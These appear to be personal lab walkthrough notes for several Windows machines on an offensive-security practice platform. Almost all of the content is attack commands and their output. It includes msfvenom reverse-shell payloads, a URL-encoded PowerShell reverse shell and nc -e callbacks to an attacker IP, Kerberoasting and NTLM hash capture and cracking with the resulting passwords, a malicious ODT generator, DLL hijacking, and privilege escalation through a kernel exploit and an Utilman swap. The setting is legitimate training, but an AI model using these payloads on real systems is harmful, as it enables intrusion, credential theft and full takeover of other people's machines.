
## Helpdesk
1. Rustscan 
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ rustscan 192.168.235.43

Open 192.168.235.43:135
Open 192.168.235.43:139
Open 192.168.235.43:445
Open 192.168.235.43:3389
Open 192.168.235.43:8080
```

2. Vulnerable with CVE-2024-5301.py for ManageEngine ServiceDesk Plus 7.6.0. 

3. Found default credentials for 8080 login page. (Administrator:Administrator)

4. Execute exploit. 
```
a. Generate msfvenom payload
 msfvenom -p java/shell_reverse_tcp LHOST=192.168.56.108 LPORT=4444 -f war > shell.war

b. Run exploit
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ python3 ./CVE-2014-5301.py 192.168.235.43 8080 administrator administrator shell.war
Trying http://192.168.235.43:8080/bPN9UbHZb6VWNjH7XXS8gxkVOVvCN5vs/giizuehuq/cFyilP9oQl2RnDPh

c. Obatined rever shell
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ nc -nvlp 4444  
listening on [any] 4444 ...
connect to [192.168.45.206] from (UNKNOWN) [192.168.235.43] 49192
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\ManageEngine\ServiceDesk\bin>
```

5. Obatined proof.txt
```
C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
102edf416b58df65fca770163b2d4252
```

## Access
1. Rustscan
```
──(kali㉿kali)-[~/OSCP/htb]
└─$ rustscan 192.168.169.187

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49666/tcp open  unknown          syn-ack
49668/tcp open  unknown          syn-ack
49673/tcp open  unknown          syn-ack
49674/tcp open  unknown          syn-ack
49677/tcp open  unknown          syn-ack
49706/tcp open  unknown          syn-ack
49792/tcp open  unknown          syn-ack
```

2. Nmap
```
┌──(kali㉿kali)-[~/OSCP/htb]
└─$ nmap -p$(cat access-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.169.187
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-08 06:54 EST
Nmap scan report for 192.168.169.187
Host is up (0.32s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Access The Event
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-08 11:54:42Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49792/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-03-08T11:55:38
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.50 seconds
```

3. Initial foothold by upload file with buying tickets. 
```
a. Upload a file that added rule to added new file type. 
┌──(kali㉿kali)-[~/OSCP/htb]
└─$ cat .htaccess 
AddType application/x-httpd-php .evil

b. Upload file that allows cmd. (rev.evil)

c. Obtained reverse shell. 
http://192.168.222.187/uploads/rev.evil?cmd=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27192.168.45.198%27%2C4444%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

┌──(kali㉿kali)-[~/OSCP/htb]
└─$ nc -nvlp 4444      
listening on [any] 4444 ...
connect to [192.168.45.198] from (UNKNOWN) [192.168.222.187] 49809
dir


    Directory: C:\xampp\htdocs\uploads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        3/12/2024   5:21 AM             38 .htaccess                                                             
-a----        3/12/2024   5:22 AM             44 rev.evil                                                              


PS C:\xampp\htdocs\uploads> 
```

4. Use powerview.ps1 for seeing user sid. Transfer powerview.ps1
```
PS C:\xampp\htdocs\uploads> Get-netuser svc_mssql


company                       : Access
logoncount                    : 1
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=MSSQL,CN=Users,DC=access,DC=offsec
objectclass                   : {top, person, organizationalPerson, user}
lastlogontimestamp            : 4/8/2022 2:40:02 AM
usncreated                    : 16414
samaccountname                : svc_mssql
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 7/6/2022 5:23:18 PM
instancetype                  : 4
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
objectguid                    : 05153e48-7b4b-4182-a6fe-22b6ff95c1a9
lastlogoff                    : 12/31/1600 4:00:00 PM
whencreated                   : 4/8/2022 9:39:43 AM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : MSSQLSvc/DC.access.offsec
givenname                     : MSSQL
usnchanged                    : 73754
lastlogon                     : 4/8/2022 2:40:02 AM
badpwdcount                   : 0
cn                            : MSSQL
msds-supportedencryptiontypes : 0
objectsid                     : S-1-5-21-537427935-490066102-1511301751-1104
primarygroupid                : 513
pwdlastset                    : 5/21/2022 5:33:45 AM
name                          : MSSQL
```

5. Use of Rubeus for kerberoasting. 
```
PS C:\xampp\htdocs\uploads> .\Rubeus.exe kerberoast /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : access.offsec
[*] Searching path 'LDAP://SERVER.access.offsec/DC=access,DC=offsec' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec
[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec
[*] PwdLastSet             : 5/21/2022 5:33:45 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$BD5D232604070B2382026EE65008C7BC$F80FC0F9A1485C77C017A16643F58D4445245811933E15EA59F0A6EF05A54CAB510D76E410E94E0D21377AE8927605B3B94A4499FCBA7AB0355C5AC4FD5A6CB62CE55247CBBD363677CB2982B5EF2575FEFF73E89F367899EE1D393F6183E2F011581BE31023FFA6B3DA7C3D8A3A3A3536B68435BC028736DF6F97BCDFB21BD6AE7CF9F419C4DCDE363E3F6A4CA44D8F3229E4CEAF1AF90D3EEC1825E7DE46F9611C71F2A55B00847B13F42AF6C4263EB2CCBB174C97892D2DBF83BF1956738A8E83B24D7B1ED50BCBDD5704EADEFBF305BEEEB238C257C030950305F4D83BAC346F7017469B5A1841A585FAB3EF5192274731A3BAC0767F2B8FB6AA8C4D032BF1EE429F2996E4DE2A72180C4C1B41D0D19D4DD91231D02141762C2E2F17B92B7AE62DF167A169366F75BFA7581F3073E195FE6EA88370AED1DFF3DA542962AD93CF047932D349DABC5DA8ABC1CF68DD340B47325A8BB698F008FB0C52FF66A8D5D171EABAFF2A4E7E0DAD26B2B744EC9F454CFA8282AF8C857CAC5495200A482CD4C2C4570362B3D0A61F28362A0D68536486559A9D2DCF6E1063E865AD1E3A5BC9060DF3F844C6A4B45A5ECE181C3FCDCCB9428E707B4CCBD01A30523C76F699EE2CDAD7F571CE4E5E90ECD0C82830160F3D2D050E3FF01CCD9C334A94573066AFB70A9B4E550D1CEA8B8FADD64709E30CDB3AC562A57F4FC5622E3243A52BAA7A91371DAB9DC69FCC9C6F2DB13FB95D36AFBB105CCE001670C882C58632BEE7F8A97483C78D88F46D50DCBC610CACEEEA303F0CB340C479036C8F6C9B4F20F00E22F3E098023AB4D6D8F8274F09D4EA9C0727DDEDAE2018084F622C6CA3FB52CE68F03BEA85A1FDC563F82CC84CC5072B079F5424BEEF5C0F620FF391F8E20F6852B3424B64CF6682D8DEE429460029C74FBFC819CC821364CDA6F954E6D125016585CF2B9F5E1A26454246BF119C1B5A53F8B1D5B6761C2EF4F3287A1C0AA0849D74878F79579CDC164D095E071902C2BC28F4039CF47E94D0448C280FD3B67718CC4884E23884F00DF7B89073FB1F1D3F5CAA0AAD9BF0698218D44E96B7A12A251043107C4FF6ADDBE4534841CAFE5C9D0B194EE588F36F12898DF7E1196F00E78BADBE79180AC195315BB511CFED8B88A83EE648F6F4732F77F34ACEE3B4D01C658EEFD85F599AE98AAA90F5947E1F14DB4E38909839252BA8867BC837F8DEDA0E4DCD09172E1822D208A60715B263099A0F6A5437471E55DEDB7D9276AC8321B35B7905AD44754BAD4D79E50099BDFDF30447C36E2A32D89916732A3CDFE6B99F58F152E57659C5CB3D57E4779ED8E1A75D2DEEA32A88A7FBF35002772197868A78FA67B4D728C39C9C11856F484A0396FDCBCB16EDD484737CB3C480B36AD472085E769AF125CA9C6E5F21F2AD9099B1A465007153D738F19F3AD21EF6173F416693252BCD22A9D0451FDAA79CBB53CCB4EDC8D84777DFD9738345CBC68BEBCD9819ED5DF32379F30FE361F80C57C5A7F4E3D6C16DCA413B19F153D2FF98F21F6875C9738C133BD9C39177D48B470C852C45B3F2CF08FC780CDF8B2183BC34AEFA71535AAF12ABCA35882674A34D
```

6. Crack the hash. 
```
┌──(kali㉿kali)-[~/OSCP/htb]
└─$ john accesshash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
trustno1         (?)     
1g 0:00:00:00 DONE (2024-03-12 08:35) 100.0g/s 102400p/s 102400c/s 102400C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

7. Use of Invoke-RunasCs for reverse shell. It will allow runas command at a line with user and password together. Obtained local.txt
```
PS C:\xampp\htdocs\uploads> Invoke-RunasCs svc_mssql trustno1 'C:/xampp/htdocs/uploads/nc.exe 192.168.45.202 1234 -e cmd.exe'

┌──(kali㉿kali)-[~/OSCP/htb]
└─$ nc -nvlp 4545                   
listening on [any] 4545 ...
connect to [192.168.45.198] from (UNKNOWN) [192.168.222.187] 49960
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
access\svc_mssql

C:\Users\svc_mssql\Desktop>type local.txt
type local.txt
8ec1a6e95bb836c1198d839cf7b1c0fb

```

8. Check privileges, upload semanagevolumeexploit.exe for privilege escalation. 
```
C:\Users\svc_mssql\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State   
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled

a. Create payload
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.198 LPORT=4949 -f dll -o Printconfig.dll

b. Transfer it, run exploit. 
C:\Users\svc_mssql\Desktop>.\SeManageVolumeExploit.exe
.\SeManageVolumeExploit.exe
Entries changed: 916
DONE 

c. Copy dll payload file in right location and execute. 
C:\Users\svc_mssql\Desktop>copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\
copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\
Overwrite C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll? (Yes/No/All): yes
yes
        1 file(s) copied.


PS C:\Windows\system32> $type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")

PS C:\Windows\system32> $object = [Activator]::CreateInstance($type)
```

9. Obtained reverse shell and proof.txt
```
┌──(kali㉿kali)-[~/OSCP/htb]
└─$ nc -nvlp 4949          
listening on [any] 4949 ...
connect to [192.168.45.198] from (UNKNOWN) [192.168.222.187] 50076
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
4ff064d55ebf17dfa8af8c38100ec4ea
```


## Algernon

1. Rustscan and nmap
```
PORT      STATE  SERVICE       VERSION
21/tcp    open   ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  10:31PM       <DIR>          ImapRetrieval
| 03-12-24  07:12AM       <DIR>          Logs
| 04-29-20  10:31PM       <DIR>          PopRetrieval
|_04-29-20  10:32PM       <DIR>          Spool
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open   http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds?
5040/tcp  open   unknown
7680/tcp  closed pando-pub
9998/tcp  open   http          Microsoft IIS httpd 10.0
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: Tue, 12 Mar 2024 14:21:07 GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
|_http-server-header: Microsoft-IIS/10.0
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /interface/root
17001/tcp open   remoting      MS .NET Remoting services
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49668/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-03-12T14:21:09
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

2. Found smartermail exploit. 
```
https://www.exploit-db.com/exploits/15048
```

3. Change it ips and ports and run exploit. 
```
python 49216.py 

nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.198] from (UNKNOWN) [192.168.222.65] 49956
id
PS C:\Windows\system32> whoami
nt authority\system
```

4. Found Proof.txt
```
PS C:\Users\Administrator\Desktop> cat proof.txt
a07482b167745d4e810ea2fbdf6fa76f
```

## Authby
1. Rustscan and Nmap
```
PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Mar 12 22:57 log
| ----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Jan 23  2023 accounts
242/tcp  open  http               Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
|_http-title: 401 Authorization Required
3145/tcp open  zftp-admin         zFTPServer admin
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2024-03-12T16:07:32+00:00
|_ssl-date: 2024-03-12T16:07:39+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=LIVDA
| Not valid before: 2023-01-22T09:37:27
|_Not valid after:  2023-07-24T09:37:27
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

2. Anonymous login in port 21, figured out admin user is there in backup, guess admin:admin as creds to login in ftp. It succeed, then upload a windows php reverse shell file. 
```
https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php

tp> put winrevshell.php 
local: winrevshell.php remote: winrevshell.php
229 Entering Extended Passive Mode (|||2053|)
150 File status okay; about to open data connection.
100% |***********************************|  6542       31.83 MiB/s    00:00 ETA
226 Closing data connection.
```

3. Obtained reverse shell. Local.txt
```
http://192.168.222.46:242/winrevshell.php

┌──(kali㉿kali)-[~/OSCP/pg]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.45.198] from (UNKNOWN) [192.168.222.46] 49167
b374k shell : connected

Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\wamp\www>

C:\Users\apache\Desktop>type local.txt
type local.txt
1d35fb4969fbe84ea73c5a59a1a72dd1
```

4. Outdated windows version so, used kernal exploit for priesc. Proof.txt
```
https://www.exploit-db.com/exploits/40564

a. Prepare exploit and upload. 
i686-w64-mingw32-gcc 40564.c -o pwn.exe -lws2_32
ftp> put pwn.exe 

b. Run exploit
C:\wamp\www>.\pwn.exe   
.\pwn.exe

c:\Windows\System32>whoami
whoami
nt authority\system

c:\Users\Administrator\Desktop>type proof.txt
type proof.txt
bcd86c0525b8853e6939e81b8858856f
```


## Craft2

1. Rustscan and nmap 
```
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack
135/tcp   open  msrpc        syn-ack
445/tcp   open  microsoft-ds syn-ack
49666/tcp open  unknown      syn-ack

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Craft
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
49666/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-03-23T09:38:37
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

2. Can upload odt file. Use exploit to create malicious odt file. https://github.com/rmdavy/badodf/blob/master/badodt.py
```
python3 badodt.py

    ____            __      ____  ____  ______
   / __ )____ _____/ /     / __ \/ __ \/ ____/
  / __  / __ `/ __  /_____/ / / / / / / /_    
 / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/    
/_____/\__,_/\__,_/      \____/_____/_/     


Create a malicious ODF document help leak NetNTLM Creds

By Richard Davy 
@rd_pentest
Python3 version by @gustanini
www.secureyourit.co.uk


Please enter IP of listener: 192.168.45.153
/home/kali/OSCP/pg/bad.odt successfully created
```

3. Upload file and capture ntlm hash using responder. 
```
sudo responder -I tun0 -v 

SMB] NTLMv2-SSP Client   : 192.168.223.188
[SMB] NTLMv2-SSP Username : CRAFT2\thecybergeek
[SMB] NTLMv2-SSP Hash     : thecybergeek::CRAFT2:ed658a329ebae08f:8092E4AB4A10B3CB73718B670199A3A3:0101000000000000005CBFC9E47CDA0163B1363FF7116978000000000200080050004E003600450001001E00570049004E002D0032004C004300340057004D0052004B0059003500420004003400570049004E002D0032004C004300340057004D0052004B005900350042002E0050004E00360045002E004C004F00430041004C000300140050004E00360045002E004C004F00430041004C000500140050004E00360045002E004C004F00430041004C0007000800005CBFC9E47CDA01060004000200000008003000300000000000000000000000003000009DAD080303EA6CE68AAFBA3B7D64375D24E9232BF6346082091ABD647F55EC070A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100350033000000000000000000  

john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt craft2hash
winniethepooh    (thecybergeek) 
```

4. Foothold. Upload msfvenom reverse shell in smbclient. Obtained local.txt
```
enum4linux -a -u "CRAFT2\\thecybergeek" -p "winniethepooh" 192.168.187.188


msfvenom -p php/reverse_php LHOST=192.168.45.153 LPORT=4449 -o s.php

http://192.168.223.188/s.php

nc -lvnp 4449
listening on [any] 4449 ...
connect to [192.168.45.153] from (UNKNOWN) [192.168.223.188] 49797

whoami
craft2\apache
PS C:\xampp\htdocs> 

Make sure to get another proper shell
```

5. Everything for privilege escalation. 
```
chisel server -p 8000 --reverse

.\chisel.exe client 192.168.213.128:8000 R:3306:127.0.0.1:3306

mysql -u root -h 127.0.0.1
select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';
select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";
select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";

C:\test>WerTrigger.exe
WerTrigger.exe
C:\test\nc.exe 192.168.213.128 445 -e cmd.exe

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 445
```
## Heist
1. Rustscan and Nmap
```
53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,8080,9389,49666,49669,49673,49674,49677,49705,49759

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-11 04:44:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HEIST
|   NetBIOS_Domain_Name: HEIST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: heist.offsec
|   DNS_Computer_Name: DC01.heist.offsec
|   DNS_Tree_Name: heist.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2024-04-11T04:45:06+00:00
| ssl-cert: Subject: commonName=DC01.heist.offsec
| Not valid before: 2024-03-22T06:03:39
|_Not valid after:  2024-09-21T06:03:39
|_ssl-date: 2024-04-11T04:45:46+00:00; +1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
|_http-title: Super Secure Web Browser
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
49759/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-04-11T04:45:09
|_  start_date: N/A
```

2. Start Responder and get response from port 8080
```
sudo responder -I tun0 -v

type this in port 8080 page:  http://kaliIP/

capture ntlmv2 hash: 
enox::HEIST:415b85fdeb39d439:C94A6844A819C686DBDBEB21F7C5590A:0101000000000000B8A6BB0CCB8BDA017FEBB2F7A2F496900000000002000800560035005100380001001E00570049004E002D004A0058004300450031004C005900420037004F004F000400140056003500510038002E004C004F00430041004C0003003400570049004E002D004A0058004300450031004C005900420037004F004F002E0056003500510038002E004C004F00430041004C000500140056003500510038002E004C004F00430041004C00080030003000000000000000000000000030000003C871E315B08F3D0B7DFAFEBB99708690E3368808ADAA080B07C99914FB52C40A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003200340039000000000000000000 
```

3. Crack it and log in. 
```
hashcat -m 5600 enox.hash /usr/share/wordlists/rockyou.txt --force

crackmapexec winrm 192.168.187.165 -u enox -p california -d heist.offsec 

evil-winrm  -i 192.168.187.165 -u enox -p 'california' 

*Evil-WinRM* PS C:\Users\enox\Desktop> cat local.txt
7f6c4af1036fb4573b4053a28b6c0451
```

4. Enumerating user enox, checking out groups through bloodhound. Able to move laterally to svc_apache. 
```
net user enox

net localgroup administrators

Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}

.\GMSAPasswordReader.exe --AccountName 'svc_apache'
```

5. Privilege escalation (SeRestorePrivilege)
```
evil-winrm -i 192.168.187.165 -u svc_apache$ -H DA55A6102C791A052798C4B7EF6C0122

*Evil-WinRM* PS C:\Windows\system32> ren Utilman.exe Utilman.old
*Evil-WinRM* PS C:\Windows\system32> ren cmd.exe Utilman.exe
```

6. Obtained proof.txt
```
1. rdesktop 192.168.187.165

2. ctrl + U

3. type C:\Users\Administrator\Desktop\proof.txt
```

## Hutch
1. Rustscan
```
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49666/tcp open  unknown          syn-ack
49668/tcp open  unknown          syn-ack
49673/tcp open  unknown          syn-ack
49674/tcp open  unknown          syn-ack
